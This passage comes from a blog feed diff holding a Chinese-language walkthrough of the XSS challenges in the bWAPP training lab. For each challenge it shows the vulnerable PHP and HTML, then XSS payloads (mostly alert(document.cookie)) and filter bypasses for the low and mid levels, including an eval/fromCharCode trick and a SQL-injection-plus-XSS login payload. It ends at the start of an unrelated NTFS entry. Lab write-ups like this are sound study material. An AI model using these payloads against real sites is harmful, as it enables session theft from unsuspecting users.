+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&#125;]&#125;';alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//"</span>&#125;]&#125;<span class="string">';&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//&lt;script&gt;</span></span><br><span class="line"><span class="string">//		var JSONResponseString = '</span>&lt;?php echo $string ?&gt;<span class="string">';</span></span><br><span class="line"><span class="string">//变为</span></span><br><span class="line"><span class="string">//&lt;script&gt;</span></span><br><span class="line"><span class="string">//		var JSONResponseString = '</span>&#123;<span class="string">"movies"</span>:[&#123;<span class="string">"response"</span>:<span class="string">""</span>&#125;]&#125;<span class="string">';alert(document.cookie)  &lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h4><p>使用 <code>htmlspecialchars()</code>函数把特殊字符（&amp; ‘ “ &lt; &gt;）转义为HTML实体无法桡过</p>
+<h3 id="AJAX反射"><a href="#AJAX反射" class="headerlink" title="AJAX反射"></a>AJAX反射</h3><h4 id="low-mid"><a href="#low-mid" class="headerlink" title="low/mid"></a>low/mid</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="built_in">document</span>.cookie)&gt;</span><br><span class="line"><span class="comment">//&lt;svg onload=alert(document.cookie)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>使用 <code>htmlspecialchars()</code>函数把特殊字符（&amp; ‘ “ &lt; &gt;）转义为HTML实体无法桡过</p>
+<h3 id="XML反射"><a href="#XML反射" class="headerlink" title="XML反射"></a>XML反射</h3><h4 id="low-mid-1"><a href="#low-mid-1" class="headerlink" title="low/mid"></a>low/mid</h4><p><strong>在XML解析payload需要注意&lt;&gt;两个字符需要使用HTML实体编码</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&amp;lt;img src=x onerror=alert(<span class="built_in">document</span>.cookie)&amp;gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h4><p>使用 <code>htmlspecialchars()</code>函数把特殊字符（&amp; ‘ “ &lt; &gt;）转义为HTML实体无法桡过</p>
+<h3 id="Referer-注入"><a href="#Referer-注入" class="headerlink" title="Referer 注入"></a>Referer 注入</h3><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS - Reflected (Back Button)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click the button to go to back to the previous page:</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">value</span>=<span class="string">"Go back"</span> <span class="attr">onClick</span>=<span class="string">"document.location.href='&lt;?php echo isset($_SERVER["</span><span class="attr">HTTP_REFERER</span>"]) ? <span class="attr">xss</span>($<span class="attr">_SERVER</span>["<span class="attr">HTTP_REFERER</span>"]) <span class="attr">:</span> ""?&gt;</span>'"&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201006183234683.png" alt="image-20201006183234683"></p>
+<p>对onClick进行适当闭合即可</p>
+<h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201006183413428.png" alt="image-20201006183413428"></p>
+<h4 id="mid-1"><a href="#mid-1" class="headerlink" title="mid"></a>mid</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此处使用addslashes()函数导致<code>&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>但是 <code>&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>却可以绕过，可见 <code>&gt;</code>之前的 <code>&quot;</code>不受影响</p>
+<h4 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="Header注入"><a href="#Header注入" class="headerlink" title="Header注入"></a>Header注入</h3><h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS - Reflected (Custom Header)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some web clients use custom HTTP request headers...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    Content of our <span class="tag">&lt;<span class="name">b</span>&gt;</span>bWAPP<span class="tag">&lt;/<span class="name">b</span>&gt;</span> header:</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>(getallheaders() <span class="keyword">as</span> $name =&gt; $value)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($name == <span class="string">"bWAPP"</span>)				<span class="comment">//如果存在名为bWAPP的请求头，就读取请求头内容</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;i&gt;"</span> . xss($value) .<span class="string">"&lt;/i&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">bWAPP: <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201006185758145.png" alt="image-20201006185758145"></p>
+<h4 id="mid-2"><a href="#mid-2" class="headerlink" title="mid"></a>mid</h4><p>只要payload中不出现 <code>&#39; &quot; \</code>,均可绕过</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">bWAPP: <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="eval注入"><a href="#eval注入" class="headerlink" title="eval注入"></a>eval注入</h3><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"document.write(&lt;?php echo xss($_GET["</span>date<span class="string">"])?&gt;)"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>更改url参数，进行注入</p>
+<p>可利用 <code>document.write()</code>直接执行alert()，或对eval()进行闭合</p>
+<h4 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment">//)");alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-3"><a href="#mid-3" class="headerlink" title="mid"></a>mid</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">47</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">47</span>,<span class="number">41</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//eval(alert(/xss/))</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.runoob.com/jsref/jsref-eval.html" target="_blank" rel="noopener">JavaScript eval() 函数</a></p>
+<p><a href="https://www.runoob.com/jsref/jsref-fromcharcode.html" target="_blank" rel="noopener">JavaScript fromCharCode() 方法</a></p>
+<h4 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h4><p>写死了，只要不是Date()函数就报错，无法绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"date"</span>]))</span><br><span class="line">   &#123;    </span><br><span class="line">       <span class="keyword">if</span>($_COOKIE[<span class="string">"security_level"</span>] == <span class="string">"2"</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span>($_GET[<span class="string">"date"</span>] != <span class="string">"Date()"</span>)</span><br><span class="line">           &#123; </span><br><span class="line">               <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;font color=\"red\"&gt;Invalid input detected!&lt;/font&gt;&lt;/p&gt;"</span>;     </span><br><span class="line"></span><br><span class="line">           &#125;&#125;&#125;         </span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="HREF注入"><a href="#HREF注入" class="headerlink" title="HREF注入"></a>HREF注入</h3><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;td align="center"&gt; &lt;a href=xss_href-3.php?movie=&lt;?php echo $row["id"]; ?&gt;&amp;name=&lt;?php echo hpp($name);?&gt;&amp;action=vote&gt;Vote&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过对 <code>$name</code>的控制，实现绕过</p>
+<h4 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">name=?&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span>&amp;action=vote</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-high-1"><a href="#mid-high-1" class="headerlink" title="mid/high"></a>mid/high</h4><p>使用 <code>urlencode()</code>进行url编码，无法绕过</p>
+<h3 id="Login-form注入"><a href="#Login-form注入" class="headerlink" title="Login form注入"></a>Login form注入</h3><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过sql注入和xss联合使用</p>
+<h4 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">' or 1=1 "&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-high-2"><a href="#mid-high-2" class="headerlink" title="mid/high"></a>mid/high</h4><p>无法绕过</p>
+<h3 id="PHP-SELF-注入"><a href="#PHP-SELF-注入" class="headerlink" title="PHP_SELF 注入"></a>PHP_SELF 注入</h3><h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"form"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"firstname"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"lastname"</span>]))</span><br><span class="line">    &#123;   </span><br><span class="line">        $firstname = $_GET[<span class="string">"firstname"</span>];</span><br><span class="line">        $lastname = $_GET[<span class="string">"lastname"</span>];    </span><br><span class="line">        <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Please enter both fields...&lt;/font&gt;"</span>;       </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>            </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Welcome "</span> . xss($firstname) . <span class="string">" "</span> . xss($lastname);   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对用户输入内容进行输出。（类似留言板）</p>
+<h4 id="low-7"><a href="#low-7" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-4"><a href="#mid-4" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="请求头Referer注入"><a href="#请求头Referer注入" class="headerlink" title="请求头Referer注入"></a>请求头Referer注入</h3><h4 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_REFERER"</span>])) </span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="comment">// print_r($_SERVER);</span></span><br><span class="line">        $referer = $_SERVER[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;The referer: &lt;i&gt;"</span> . xss($referer) . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>     </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;font color=\"red\"&gt;No referer was used!&lt;/font&gt;&lt;/p&gt;"</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与留言版类似，注入点在 <code>Referer</code> 字段</p>
+<h4 id="low-8"><a href="#low-8" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-5"><a href="#mid-5" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-7"><a href="#high-7" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="请求头User-Agent注入"><a href="#请求头User-Agent注入" class="headerlink" title="请求头User-Agent注入"></a>请求头User-Agent注入</h3><h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_USER_AGENT"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// print_r($_SERVER);</span></span><br><span class="line">        $user_agent = $_SERVER[<span class="string">"HTTP_USER_AGENT"</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your User-Agent: &lt;i&gt;"</span> . xss($user_agent) . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;font color=\"red\"&gt;No User-Agent was used!&lt;/font&gt;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="low-9"><a href="#low-9" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-6"><a href="#mid-6" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-8"><a href="#high-8" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;id; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;owner; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;date; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row-&gt;entry; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--根据不同的security_level对$row-&gt;entry进行消毒--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="low-10"><a href="#low-10" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid-7"><a href="#mid-7" class="headerlink" title="mid"></a>mid</h4><p>不出现 <code>&#39; &quot; \</code> 即可</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high-9"><a href="#high-9" class="headerlink" title="high"></a>high</h4><p>无法绕过</p>
+<h3 id="Change-Secret-HTML-hidden-注入"><a href="#Change-Secret-HTML-hidden-注入" class="headerlink" title="Change Secret(HTML hidden)注入"></a>Change Secret(HTML hidden)注入</h3><h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//low 对提交的$login和$secret都进行了严格的消毒</span></span><br><span class="line">    $login = mysqli_real_escape_string($link, $login);</span><br><span class="line">    $secret = mysqli_real_escape_string($link, $secret);</span><br><span class="line">    $secret = xss($secret);</span><br><span class="line"></span><br><span class="line"><span class="comment">//mid high对提交的$secret都进行了严格的消毒</span></span><br><span class="line">    $secret = mysqli_real_escape_string($link, $secret);</span><br><span class="line">    $secret = htmlspecialchars($secret, ENT_QUOTES, <span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>故无法直接对 <code>secret</code>进行注入</p>
+<h4 id="low-11"><a href="#low-11" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/bWAPP-XSS/image-20201007191839789.png" alt="image-20201007191839789"></p>
+<h4 id="mid-high-3"><a href="#mid-high-3" class="headerlink" title="mid/high"></a>mid/high</h4><p>无法绕过</p>
+]]></content>
+  </entry>
+  <entry>
     <title>NTFS-ADS</title>
     <url>/2020/09/27/NTFS-ADS/</url>
     <content><![CDATA[<h1 id="NTFS交换数据流"><a href="#NTFS交换数据流" class="headerlink" title="NTFS交换数据流"></a>NTFS交换数据流</h1><h2 id="NTFS-ADS是什么"><a href="#NTFS-ADS是什么" class="headerlink" title="NTFS ADS是什么"></a>NTFS ADS是什么</h2><p>NTFS交换数据流（<code>alternate data streams</code>简称ADS）是NTFS磁盘格式的一个特性。</p>
